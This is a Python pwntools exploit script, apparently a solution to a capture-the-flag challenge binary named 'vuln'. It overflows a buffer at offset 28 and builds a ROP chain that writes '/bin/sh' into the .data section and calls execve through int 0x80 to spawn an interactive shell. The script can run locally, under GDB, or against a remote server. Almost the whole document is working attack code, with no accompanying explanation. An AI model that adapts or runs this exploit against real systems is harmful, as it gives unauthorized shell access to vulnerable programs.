#!/usr/bin/python3
# Author: Hack.You
from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x08049dcf
continue
'''.format(**locals())

# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Gadgets
offset = 28
data_section = 0x80e5060 # .data section
syscall = 0x8071650 # int 0x80; ret;
pop_ecx = 0x8049e39 # pop ecx; ret; 
pop_eax = 0x80b074a # pop eax; ret; 
pop_edx_ebx = 0x80583c9 # pop edx; pop ebx; ret; 
mov_eax_edx = 0x809e5d8 # mov dword ptr [eax], edx; ret;   

# Build the payload execve('/bin/sh', 0, 0)
payload = flat({
    offset: [
        pop_eax,
        data_section,
        pop_edx_ebx,
        b'/bin', # write the first 4 bytes into .data
        0x0, # null byte since its not needed
        mov_eax_edx,
        pop_eax,
        data_section + 0x4,
        pop_edx_ebx,
        b'/sh\x00', # write the last bytes for /bin/sh into .data
        0x0,
        mov_eax_edx, # mov /bin/sh into .data
        # https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
        pop_edx_ebx,
        0x0,
        data_section,
        pop_ecx,
        0x0,
        pop_eax,
        0x0b,
        syscall
    ]
})

io.sendlineafter(b'!', payload)

io.interactive()
